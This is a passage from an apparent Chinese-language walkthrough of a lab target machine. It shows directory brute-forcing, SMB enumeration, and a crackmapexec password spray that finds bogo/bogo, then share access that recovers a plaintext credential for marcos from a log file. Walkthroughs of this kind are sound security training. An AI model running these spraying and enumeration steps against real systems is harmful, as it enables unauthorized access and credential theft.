</span><br><span class="line">[06:14:54] 400 -    4KB - /http%3A%2F%2Fweblog                               </span><br><span class="line">[06:15:10] 400 -    4KB - /http%3A%2F%2Fswik                                 </span><br><span class="line">                                                                              </span><br><span class="line">Task Completed</span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[~/Desktop]</span><br><span class="line">└─<span class="comment"># dirsearch -u &quot;http://10.0.3.30/aspnet_client/system_web/&quot; -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e asp,aspx,htm  -t 50 2&gt;&amp;/dev/null</span></span><br><span class="line"></span><br><span class="line">  _|. _ _  _  _  _ _|_    v0.4.3</span><br><span class="line"> (_||| _) (/_(_|| (_| )</span><br><span class="line"></span><br><span class="line">Extensions: asp, aspx, htm | HTTP method: GET | Threads: 50 | Wordlist size: 220545</span><br><span class="line"></span><br><span class="line">Output File: /root/Desktop/reports/http_10.0.3.30/_aspnet_client_system_web__24-10-27_05-18-00.txt</span><br><span class="line"></span><br><span class="line">Target: http://10.0.3.30/</span><br><span class="line"></span><br><span class="line">[05:18:00] Starting: aspnet_client/system_web/</span><br><span class="line">[05:18:56] 404 -    2KB - /aspnet_client/system_web/%20                     </span><br><span class="line">[05:19:48] 400 -    4KB - /aspnet_client/system_web/*checkout*              </span><br><span class="line">[05:22:03] 400 -    4KB - /aspnet_client/system_web/*docroot*               </span><br><span class="line">[05:22:17] 400 -    4KB - /aspnet_client/system_web/*                       </span><br><span class="line">[05:22:43] 404 -    2KB - /aspnet_client/system_web/con                     </span><br><span class="line">[05:24:06] 400 -    4KB - /aspnet_client/system_web/http%3A%2F%2Fwww        </span><br><span class="line">[05:26:45] 400 -    4KB - /aspnet_client/system_web/http%3A                 </span><br><span class="line">[05:27:43] 400 -    4KB - /aspnet_client/system_web/q%26a                   </span><br><span class="line">[05:27:50] 400 -    4KB - /aspnet_client/system_web/**http%3a               </span><br><span class="line">[05:28:54] 400 -    4KB - /aspnet_client/system_web/*http%3A                </span><br><span class="line">[05:31:13] 404 -    2KB - /aspnet_client/system_web/aux                     </span><br><span class="line">[05:33:09] 400 -    4KB - /aspnet_client/system_web/**http%3A               </span><br><span class="line">[05:33:13] 400 -    4KB - /aspnet_client/system_web/http%3A%2F%2Fyoutube    </span><br><span class="line">[05:36:46] 400 -    4KB - /aspnet_client/system_web/http%3A%2F%2Fblogs      </span><br><span class="line">[05:37:19] 400 -    4KB - /aspnet_client/system_web/http%3A%2F%2Fblog       </span><br><span class="line">[05:40:18] 400 -    4KB - /aspnet_client/system_web/**http%3A%2F%2Fwww      </span><br><span class="line">[05:41:46] 400 -    4KB - /aspnet_client/system_web/s%26p                   </span><br><span class="line">[05:46:29] 400 -    4KB - /aspnet_client/system_web/%3FRID%3D2671            </span><br><span class="line">[05:47:44] 400 -    4KB - /aspnet_client/system_web/devinmoore*              </span><br><span class="line">[05:55:41] 404 -    2KB - /aspnet_client/system_web/KeithRankin%20           </span><br><span class="line">[06:01:23] 404 -    2KB - /aspnet_client/system_web/How_to%2e%2e%2e          </span><br><span class="line">[06:01:23] 404 -    2KB - /aspnet_client/system_web/Wanted%2e%2e%2e          </span><br><span class="line">[06:03:00] 404 -    2KB - /aspnet_client/system_web/kaspersky%20             </span><br><span class="line">[06:06:29] 400 -    4KB - /aspnet_client/system_web/200109*                  </span><br><span class="line">[06:07:09] 400 -    4KB - /aspnet_client/system_web/*dc_                     </span><br><span class="line">[06:07:10] 400 -    4KB - /aspnet_client/system_web/*sa_                     </span><br><span class="line">[06:13:12] 400 -    4KB - /aspnet_client/system_web/http%3A%2F%2Fcommunity   </span><br><span class="line">[06:15:05] 400 -    4KB - /aspnet_client/system_web/Chamillionaire%20%26%20Paul%20Wall-%20Get%20Ya%20Mind%20Correct</span><br><span class="line">[06:15:05] 400 -    4KB - /aspnet_client/system_web/Clinton%20Sparks%20%26%20Diddy%20-%20Dont%20Call%20It%20A%20Comeback%28RuZtY%29</span><br><span class="line">[06:15:07] 400 -    4KB - /aspnet_client/system_web/DJ%20Haze%20%26%20The%20Game%20-%20New%20Blood%20Series%20Pt</span><br><span class="line">[06:16:21] 400 -    4KB - /aspnet_client/system_web/http%3A%2F%2Fradar       </span><br><span class="line">[06:19:08] 400 -    4KB - /aspnet_client/system_web/q%26a2                   </span><br><span class="line">[06:19:19] 400 -    4KB - /aspnet_client/system_web/login%3f                 </span><br><span class="line">[06:20:42] 400 -    4KB - /aspnet_client/system_web/Shakira%20Oral%20Fixation%201%20%26%202</span><br><span class="line">[06:20:42] 404 -    2KB - /aspnet_client/system_web/Cirque%20du%20soleil%20  </span><br><span class="line">[06:21:56] 400 -    4KB - /aspnet_client/system_web/http%3A%2F%2Fjeremiahgrossman</span><br><span class="line">[06:21:58] 400 -    4KB - /aspnet_client/system_web/http%3A%2F%2Fweblog      </span><br><span class="line">[06:22:10] 400 -    4KB - /aspnet_client/system_web/http%3A%2F%2Fswik        </span><br><span class="line">                                                                              </span><br><span class="line">Task Completed          </span><br></pre></td></tr></table></figure>
<h3 id="smb-信息收集">1.4. SMB 信息收集</h3>
<p>扫描 SMB</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop]</span><br><span class="line">└─<span class="comment"># enum4linux -a 10.0.3.30        </span></span><br><span class="line">Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Sun Oct 27 08:16:56 2024</span><br><span class="line"></span><br><span class="line"> =========================================( Target Information )=========================================</span><br><span class="line"></span><br><span class="line">Target ........... 10.0.3.30</span><br><span class="line">RID Range ........ 500-550,1000-1050</span><br><span class="line">Username ......... <span class="string">&#x27;&#x27;</span></span><br><span class="line">Password ......... <span class="string">&#x27;&#x27;</span></span><br><span class="line">Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> =============================( Enumerating Workgroup/Domain on 10.0.3.30 )=============================</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[+] Got domain/workgroup name: WORKGROUP</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> =================================( Nbtstat Information <span class="keyword">for</span> 10.0.3.30 )=================================</span><br><span class="line"></span><br><span class="line">Looking up status of 10.0.3.30</span><br><span class="line">        SIMPLE          &lt;00&gt; -         B &lt;ACTIVE&gt;  Workstation Service</span><br><span class="line">        WORKGROUP       &lt;00&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt;  Domain/Workgroup Name</span><br><span class="line">        SIMPLE          &lt;20&gt; -         B &lt;ACTIVE&gt;  File Server Service</span><br><span class="line"></span><br><span class="line">        MAC Address = 08-00-27-43-44-C4</span><br><span class="line"></span><br><span class="line"> =====================================( Session Check on 10.0.3.30 )=====================================</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[E] Server doesn<span class="string">&#x27;t allow session using username &#x27;</span><span class="string">&#x27;, password &#x27;</span><span class="string">&#x27;.  Aborting remainder of tests.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>
<p>尝试直接爆破，用户名取自 80
主页的团队成员名，可以先拿用户名做密码测试下，不行的话再拿 rockyou.txt
试试</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop]</span><br><span class="line">└─<span class="comment"># cat user.txt </span></span><br><span class="line">ruy</span><br><span class="line">marcos</span><br><span class="line">lander</span><br><span class="line">bogo</span><br><span class="line">vaiper</span><br><span class="line">                                                                                                                                                                                                                                                                                                                            </span><br><span class="line">┌──(root㉿kali)-[~/Desktop]</span><br><span class="line">└─<span class="comment"># cat pass.txt </span></span><br><span class="line">ruy</span><br><span class="line">marcos</span><br><span class="line">lander</span><br><span class="line">bogo</span><br><span class="line">vaiper</span><br><span class="line">                                                                                                                                                                                                                                                                                                                            </span><br><span class="line">┌──(root㉿kali)-[~/Desktop]</span><br><span class="line">└─<span class="comment"># crackmapexec smb 10.0.3.30 -u user.txt  -p pass.txt </span></span><br><span class="line">SMB         10.0.3.30       445    SIMPLE           [*] Windows 10 / Server 2019 Build 17763 x64 (name:SIMPLE) (domain:Simple) (signing:False) (SMBv1:False)</span><br><span class="line">SMB         10.0.3.30       445    SIMPLE           [-] Simple\ruy:ruy STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.0.3.30       445    SIMPLE           [-] Simple\ruy:marcos STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.0.3.30       445    SIMPLE           [-] Simple\ruy:lander STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.0.3.30       445    SIMPLE           [-] Simple\ruy:bogo STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.0.3.30       445    SIMPLE           [-] Simple\ruy:vaiper STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.0.3.30       445    SIMPLE           [-] Simple\marcos:ruy STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.0.3.30       445    SIMPLE           [-] Simple\marcos:marcos STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.0.3.30       445    SIMPLE           [-] Simple\marcos:lander STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.0.3.30       445    SIMPLE           [-] Simple\marcos:bogo STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.0.3.30       445    SIMPLE           [-] Simple\marcos:vaiper STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.0.3.30       445    SIMPLE           [-] Simple\lander:ruy STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.0.3.30       445    SIMPLE           [-] Simple\lander:marcos STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.0.3.30       445    SIMPLE           [-] Simple\lander:lander STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.0.3.30       445    SIMPLE           [-] Simple\lander:bogo STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.0.3.30       445    SIMPLE           [-] Simple\lander:vaiper STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.0.3.30       445    SIMPLE           [-] Simple\bogo:ruy STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.0.3.30       445    SIMPLE           [-] Simple\bogo:marcos STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.0.3.30       445    SIMPLE           [-] Simple\bogo:lander STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.0.3.30       445    SIMPLE           [-] Simple\bogo:bogo STATUS_PASSWORD_EXPIRED </span><br><span class="line">SMB         10.0.3.30       445    SIMPLE           [-] Simple\bogo:vaiper STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.0.3.30       445    SIMPLE           [-] Simple\vaiper:ruy STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.0.3.30       445    SIMPLE           [-] Simple\vaiper:marcos STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.0.3.30       445    SIMPLE           [-] Simple\vaiper:lander STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.0.3.30       445    SIMPLE           [-] Simple\vaiper:bogo STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.0.3.30       445    SIMPLE           [-] Simple\vaiper:vaiper STATUS_LOGON_FAILURE</span><br></pre></td></tr></table></figure>
<p>SMB 爆破得 <code>bogo/bogo</code> ，测试</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop]</span><br><span class="line">└─<span class="comment"># smbmap -u bogo -p bogo -H 10.0.3.30    </span></span><br><span class="line"></span><br><span class="line">    ________  ___      ___  _______   ___      ___       __         _______</span><br><span class="line">   /<span class="string">&quot;       )|&quot;</span>  \    /<span class="string">&quot;  ||   _  &quot;</span>\ |<span class="string">&quot;  \    /&quot;</span>  |     /<span class="string">&quot;&quot;</span>\       |   __ <span class="string">&quot;\</span></span><br><span class="line"><span class="string">  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)</span></span><br><span class="line"><span class="string">   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /&#x27; /\  \     |:  ____/</span></span><br><span class="line"><span class="string">    __/  \   |: \.        |(|  _  \  |: \.        |  //  __&#x27;  \    (|  /</span></span><br><span class="line"><span class="string">   /&quot;</span> \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \</span><br><span class="line">  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)</span><br><span class="line">-----------------------------------------------------------------------------</span><br><span class="line">SMBMap - Samba Share Enumerator v1.10.4 | Shawn Evans - ShawnDEvans@gmail.com&lt;mailto:ShawnDEvans@gmail.com&gt;</span><br><span class="line">                     https://github.com/ShawnDEvans/smbmap</span><br><span class="line"></span><br><span class="line">[*] Detected 1 hosts serving SMB                                                                                                  </span><br><span class="line">[*] Established 0 SMB connections(s) and 0 authenticated session(s)                                                      </span><br><span class="line">[*] Closed 0 connections   </span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─<span class="comment"># smbclient -U &#x27;bogo&#x27; -L  \\\\10.0.3.30\\</span></span><br><span class="line">Password <span class="keyword">for</span> [WORKGROUP\bogo]:</span><br><span class="line">session setup failed: NT_STATUS_LOGON_FAILURE</span><br><span class="line">                                                                                                                                                                                                                                                                                                                           </span><br><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─<span class="comment"># smbclient -U &#x27;bogo&#x27; -L  \\\\10.0.3.30\\LOGS\\</span></span><br><span class="line">Password <span class="keyword">for</span> [WORKGROUP\bogo]:</span><br><span class="line">session setup failed: NT_STATUS_LOGON_FAILURE</span><br><span class="line">                                                                                                                                                                                                                                                                                                                           </span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─<span class="comment"># smbclient -L 10.0.3.30 -U bogo -m SMB2</span></span><br><span class="line">Password <span class="keyword">for</span> [WORKGROUP\bogo]:</span><br><span class="line">session setup failed: NT_STATUS_PASSWORD_EXPIRED</span><br><span class="line">                                                                                                                                                                                                                                                                                                                           </span><br><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─<span class="comment"># smbclient -L 10.0.3.30 -U bogo -m SMB3</span></span><br><span class="line">Password <span class="keyword">for</span> [WORKGROUP\bogo]:</span><br><span class="line">session setup failed: NT_STATUS_PASSWORD_EXPIRED</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>密码过期登录不了……</p>
<p>进靶机修改 bogo 密码</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202410281543242.jpg" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202410281544845.jpg" /></p>
<p>输入新密码后回车即可</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202410281544581.jpg" /></p>
<p>SMB 再次测试正常了</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─<span class="comment"># smbmap  -H 10.0.3.30 -u bogo -p bogo         </span></span><br><span class="line"></span><br><span class="line">    ________  ___      ___  _______   ___      ___       __         _______</span><br><span class="line">   /<span class="string">&quot;       )|&quot;</span>  \    /<span class="string">&quot;  ||   _  &quot;</span>\ |<span class="string">&quot;  \    /&quot;</span>  |     /<span class="string">&quot;&quot;</span>\       |   __ <span class="string">&quot;\</span></span><br><span class="line"><span class="string">  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)</span></span><br><span class="line"><span class="string">   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /&#x27; /\  \     |:  ____/</span></span><br><span class="line"><span class="string">    __/  \   |: \.        |(|  _  \  |: \.        |  //  __&#x27;  \    (|  /</span></span><br><span class="line"><span class="string">   /&quot;</span> \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \</span><br><span class="line">  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)</span><br><span class="line">-----------------------------------------------------------------------------</span><br><span class="line">SMBMap - Samba Share Enumerator v1.10.4 | Shawn Evans - ShawnDEvans@gmail.com&lt;mailto:ShawnDEvans@gmail.com&gt;</span><br><span class="line">                     https://github.com/ShawnDEvans/smbmap</span><br><span class="line"></span><br><span class="line">[*] Detected 1 hosts serving SMB                                                                                                  </span><br><span class="line">[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                      </span><br><span class="line">                                                                                                                             </span><br><span class="line">[+] IP: 10.0.3.30:445   Name: 10.0.3.30                 Status: Authenticated</span><br><span class="line">        Disk                                                    Permissions     Comment</span><br><span class="line">        ----                                                    -----------     -------</span><br><span class="line">        ADMIN$                                                  NO ACCESS       Admin remota</span><br><span class="line">        C$                                                      NO ACCESS       Recurso predeterminado</span><br><span class="line">        IPC$                                                    READ ONLY       IPC remota</span><br><span class="line">        LOGS                                                    READ ONLY</span><br><span class="line">        WEB                                                     NO ACCESS</span><br><span class="line">[*] Closed 1 connections   </span><br></pre></td></tr></table></figure>
<p>LOGS 下找到个日志</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─<span class="comment"># smbmap  -H 10.0.3.30 -u bogo -p bogo -r &#x27;LOGS&#x27;</span></span><br><span class="line"></span><br><span class="line">    ________  ___      ___  _______   ___      ___       __         _______</span><br><span class="line">   /<span class="string">&quot;       )|&quot;</span>  \    /<span class="string">&quot;  ||   _  &quot;</span>\ |<span class="string">&quot;  \    /&quot;</span>  |     /<span class="string">&quot;&quot;</span>\       |   __ <span class="string">&quot;\</span></span><br><span class="line"><span class="string">  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)</span></span><br><span class="line"><span class="string">   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /&#x27; /\  \     |:  ____/</span></span><br><span class="line"><span class="string">    __/  \   |: \.        |(|  _  \  |: \.        |  //  __&#x27;  \    (|  /</span></span><br><span class="line"><span class="string">   /&quot;</span> \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \</span><br><span class="line">  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)</span><br><span class="line">-----------------------------------------------------------------------------</span><br><span class="line">SMBMap - Samba Share Enumerator v1.10.4 | Shawn Evans - ShawnDEvans@gmail.com&lt;mailto:ShawnDEvans@gmail.com&gt;</span><br><span class="line">                     https://github.com/ShawnDEvans/smbmap</span><br><span class="line"></span><br><span class="line">[*] Detected 1 hosts serving SMB                                                                                                  </span><br><span class="line">[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                      </span><br><span class="line">                                                                                                                             </span><br><span class="line">[+] IP: 10.0.3.30:445   Name: 10.0.3.30                 Status: Authenticated</span><br><span class="line">        Disk                                                    Permissions     Comment</span><br><span class="line">        ----                                                    -----------     -------</span><br><span class="line">        ADMIN$                                                  NO ACCESS       Admin remota</span><br><span class="line">        C$                                                      NO ACCESS       Recurso predeterminado</span><br><span class="line">        IPC$                                                    READ ONLY       IPC remota</span><br><span class="line">        LOGS                                                    READ ONLY</span><br><span class="line">        ./LOGS</span><br><span class="line">        dr--r--r--                0 Sun Oct  8 17:23:36 2023    .</span><br><span class="line">        dr--r--r--                0 Sun Oct  8 17:23:36 2023    ..</span><br><span class="line">        fr--r--r--             2200 Sun Oct  8 17:23:36 2023    20231008.<span class="built_in">log</span></span><br><span class="line">        WEB                                                     NO ACCESS</span><br><span class="line">[*] Closed 1 connections                                                                            </span><br><span class="line">                                                                                                                                                                                                                                                                                                                           </span><br><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─<span class="comment"># smbmap  -H 10.0.3.30 -u bogo -p bogo --download &#x27;LOGS\20231008.log&#x27;</span></span><br><span class="line"></span><br><span class="line">    ________  ___      ___  _______   ___      ___       __         _______</span><br><span class="line">   /<span class="string">&quot;       )|&quot;</span>  \    /<span class="string">&quot;  ||   _  &quot;</span>\ |<span class="string">&quot;  \    /&quot;</span>  |     /<span class="string">&quot;&quot;</span>\       |   __ <span class="string">&quot;\</span></span><br><span class="line"><span class="string">  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)</span></span><br><span class="line"><span class="string">   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /&#x27; /\  \     |:  ____/</span></span><br><span class="line"><span class="string">    __/  \   |: \.        |(|  _  \  |: \.        |  //  __&#x27;  \    (|  /</span></span><br><span class="line"><span class="string">   /&quot;</span> \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \</span><br><span class="line">  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)</span><br><span class="line">-----------------------------------------------------------------------------</span><br><span class="line">SMBMap - Samba Share Enumerator v1.10.4 | Shawn Evans - ShawnDEvans@gmail.com&lt;mailto:ShawnDEvans@gmail.com&gt;</span><br><span class="line">                     https://github.com/ShawnDEvans/smbmap</span><br><span class="line"></span><br><span class="line">[*] Detected 1 hosts serving SMB                                                                                                  </span><br><span class="line">[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                      </span><br><span class="line">[+] Starting download: LOGS\20231008.<span class="built_in">log</span> (2200 bytes)                                                                    </span><br><span class="line">[+] File output to: /root/10.0.3.30-LOGS_20231008.<span class="built_in">log</span>                                                                    </span><br><span class="line">[*] Closed 1 connections   </span><br></pre></td></tr></table></figure>
<p>下载读取得 <code>marcos/SuperPassword</code></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─<span class="comment"># cat 10.0.3.30-LOGS_20231008.log                    </span></span><br><span class="line">PS C:\&gt; <span class="built_in">dir</span> \\127.0.0.1\WEB</span><br><span class="line">Acceso denegado</span><br><span class="line">At line:1 char:1</span><br><span class="line">+ <span class="built_in">dir</span> \\127.0.0.1\WEB</span><br><span class="line">+ ~~~~~~~~~~~~~~~~~~~</span><br><span class="line">    + CategoryInfo          : PermissionDenied: (\\127.0.0.1\WEB:String) [Get-ChildItem], UnauthorizedAccessException</span><br><span class="line">    + FullyQualifiedErrorId : ItemExistsUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetChildItemCommand</span><br><span class="line">Cannot find path <span class="string">&#x27;\\127.0.0.1\WEB&#x27;</span> because it does not exist.</span><br><span class="line">At line:1 char:1</span><br><span class="line">+ <span class="built_in">dir</span> \\127.0.0.1\WEB</span><br><span class="line">+ ~~~~~~~~~~~~~~~~~~~</span><br><span class="line">    + CategoryInfo          : ObjectNotFound: (\\127.0.0.1\WEB:String) [Get-ChildItem], ItemNotFoundException</span><br><span class="line">    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.GetChildItemCommand</span><br><span class="line"></span><br><span class="line">PS C:\&gt; net use \\127.0.0.1\WEB</span><br><span class="line">Se ha completado el comando correctamente.</span><br><span class="line"></span><br><span class="line">PS C:\&gt; <span class="built_in">dir</span> \\127.0.0.1\WEB</span><br><span class="line">Acceso denegado</span><br><span class="line">At line:1 char:1</span><br><span class="line">+ <span class="built_in">dir</span> \\127.0.0.1\WEB</span><br><span class="line">+ ~~~~~~~~~~~~~~~~~~~</span><br><span class="line">    + CategoryInfo          : PermissionDenied: (\\127.0.0.1\WEB:String) [Get-ChildItem], UnauthorizedAccessException</span><br><span class="line">    + FullyQualifiedErrorId : ItemExistsUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetChildItemCommand</span><br><span class="line">Cannot find path <span class="string">&#x27;\\127.0.0.1\WEB&#x27;</span> because it does not exist.</span><br><span class="line">At line:1 char:1</span><br><span class="line">+ <span class="built_in">dir</span> \\127.0.0.1\WEB</span><br><span class="line">+ ~~~~~~~~~~~~~~~~~~~</span><br><span class="line">    + CategoryInfo          : ObjectNotFound: (\\127.0.0.1\WEB:String) [Get-ChildItem], ItemNotFoundException</span><br><span class="line">    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.GetChildItemCommand</span><br><span 